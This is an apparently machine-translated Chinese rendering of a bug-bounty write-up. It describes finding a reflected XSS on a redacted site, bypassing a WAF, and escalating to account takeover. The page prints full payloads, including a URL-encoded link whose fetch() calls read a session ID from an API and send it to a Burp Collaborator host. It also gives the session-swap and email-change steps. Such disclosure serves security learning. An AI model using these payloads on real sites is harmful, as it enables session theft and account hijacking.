<html>
<head>
<title>Weaponizing Reflected XSS to Account Takeover</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">武器化反映了XSS对账户的接管</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/weaponizing-reflected-xss-to-account-takeover-ae8aeea7aca3?source=collection_archive---------0-----------------------#2021-09-15">https://infosecwriteups.com/weaponizing-reflected-xss-to-account-takeover-ae8aeea7aca3?source=collection_archive---------0-----------------------#2021-09-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="72d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">各位猎人，这是我第一次为这个社区写文章，我将解释我是如何发现一个反映的跨站点脚本错误，并进一步升级它以实现网站上任何用户的帐户接管。</p><p id="43e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我测试的目标是一个只有一个主域的私有程序，所以我在这篇博客中称它为www.redacted.com，让我们开始吧。</p><p id="88c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">发现XSS </strong></p><p id="a945" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">参数发现</strong></p><p id="2b1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在侦察阶段，我启动了burpsuite proxy，将www.redacted.com加入了搜索范围，并开始浏览网站以获取流量。为了找到XSS，我通常使用一个名为<a class="ae kl" href="https://portswigger.net/bappstore/8e8f6bb313db46ba9e0a7539d3726651" rel="noopener ugc nofollow" target="_blank">“Reflected Parameters”</a>的Burp Suite PRO扩展，它监视由代理生成的范围内请求流量，并寻找响应中反映的请求参数值。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/8bf7764a26e82c69679b25419384d848.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*4zKSPvmQqr3aQ903"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">反射参数扩展</figcaption></figure><p id="b0e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在捕获流量时，我遇到了一个名为<code class="fe lc ld le lf b">blogPostId</code>的参数，其值反映在JS上下文中。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi lg"><img src="../Images/5b18f246fbe3e65744b76888924d543b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*ScSTr3cImGhVSzIS"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">反思发生在JS上下文中</figcaption></figure><p id="21f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我决定进一步测试这个参数，使用一个包含一组特殊字符的小字符串，类似于<code class="fe lc ld le lf b">test123'"&gt;&lt; </code>,结果发现没有适当的输入净化。</p><p id="5cb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我试图关闭现有的脚本标签，但失败了，因为脚本标签被封锁，由于WAF正在执行。因此，下一个有效负载被用来调用现有脚本标签中的alert函数，但是WAF阻塞了这个请求。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/3889bab9c60018366d900058d2e41a92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*rUurXRXaTKVSJ5Eh"/></div></div></figure><p id="9d6d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">模糊了一会儿后，我使用iife函数绕过了限制，弹出了一个警告框，显示了以下有效载荷:</p><blockquote class="lh li lj"><p id="e272" class="jn jo lk jp b jq jr js jt ju jv jw jx ll jz ka kb lm kd ke kf ln kh ki kj kk ij bi translated"><code class="fe lc ld le lf b"><em class="iq">https://www.redacted.com/preview/001981ba?blogPostId=test123";(alert)("xss")//</em></code></p></blockquote><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/5ba60708bd88b7ecbd5f22cfafdf513c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*B3UxKoErXMJDCAXz"/></div></div></figure><p id="8596" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">升级为ATO </strong></p><p id="bb69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">增加XSS影响的最有用的方法是窃取受害者的会话id，这将导致整个帐户被接管。因此，我注意到了Burp的历史日志中的请求，并发现一个API请求在JSON格式的响应中泄露了用户的会话id。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/4603256463b27a2313bd1ba7f766f599.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*j1BRLboZyHDbLZxS"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">API端点泄漏sessionID</figcaption></figure><p id="6a49" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">端点泄漏会话ID:<br/><em class="lk">https://www.redacted.com/api/uis/accounts/current/sso</em></p><p id="f658" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">构建有效载荷</strong></p><p id="03fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用了以下有效载荷来实施攻击:</p><blockquote class="lh li lj"><p id="01fb" class="jn jo lk jp b jq jr js jt ju jv jw jx ll jz ka kb lm kd ke kf ln kh ki kj kk ij bi translated"><code class="fe lc ld le lf b"><em class="iq">";fetch('https://www.redacted.com/api/uis/accounts/current/sso').then(a=&gt; a.text()).then(a=&gt; fetch('https://random.burpcollaborator.net?x='+a))//</em></code></p></blockquote><p id="9a50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">解释:</strong>这里我在有效载荷中使用javascript的fetch()方法，指示web浏览器向URL发送请求。第一个fetch()向这个api端点<em class="lk">https://www.redacted.com/api/uis/accounts/current/sso</em>(泄漏的会话id)发送一个GET请求，我们可以用它来劫持帐户。<code class="fe lc ld le lf b"><strong class="jp ir">(a=&gt; a.text())</strong></code> <strong class="jp ir"> </strong>将数据返回到<code class="fe lc ld le lf b"><strong class="jp ir">a</strong></code> <strong class="jp ir"> </strong>变量<strong class="jp ir">中。</strong>之后，使用第二个fetch()函数发送另一个GET请求，将窃取的数据发送到攻击者控制的服务器中。为此，我简单地使用了打嗝合作者。</p><p id="08fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">页（page的缩写）感谢萨阿德·艾哈迈德 帮我构建这个有效载荷。</p><p id="7f6a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">最终网址:</strong></p><blockquote class="lh li lj"><p id="7035" class="jn jo lk jp b jq jr js jt ju jv jw jx ll jz ka kb lm kd ke kf ln kh ki kj kk ij bi translated"><code class="fe lc ld le lf b"><em class="iq">https://www.redacted.com/preview/001981ba?blogPostId=327156%22;fetch(%27https://www.redacted.com/api/uis/accounts/current/sso%27).then(a=%3E%20a.text()).then(a=%3E%20fetch(%27https://random.burpcollaborator.net?x=%27%2ba))//</em></code></p></blockquote><p id="0211" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我所要做的就是将这个链接发送给网站的任何经过身份验证的用户，一旦他们打开它，他们的会话ID就会被发送到攻击者的控制服务器(在我的例子中是Burp collaborator)。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi lo"><img src="../Images/1925e887cb93ebd35c78b160cd2890fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*KbmHvmLBbO9kh54J"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">检索到SessionID</figcaption></figure><p id="d9ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在检索到会话ID后，我首先以攻击者的身份登录，然后通过使用Firefox的inspect元素用受害者的ID替换了我的会话ID，并刷新了让我以受害者身份登录的页面，从而成功接管了会话。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/fdf66b4fab51df3947c31db895252e8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*ctRH2-mqTrfo_qLj"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated"><strong class="bd lp">在</strong>之前:以攻击者身份登录</figcaption></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/c29ff490a658730395469667df6cb33a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*XbjTb7Si_abH9THp"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">之后的<strong class="bd lp">:以受害者身份登录</strong></figcaption></figure><p id="8673" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一次我在受害者的账户里，我干脆把邮箱地址换成了我的，完全接管了这个账户。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi lq"><img src="../Images/35e2e179fa3aac9c985271629932baac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*__rM26u9ZBXkStgHNKPlXg.png"/></div></div></figure><p id="604f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">最终备注:</strong></p><p id="68a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这篇文章展示了XSS漏洞的严重性，以及如何提高报告的影响力。此外，如果你有任何疑问，请随时在推特上联系我，祝你黑客愉快！</p></div></div>    
</body>
</html>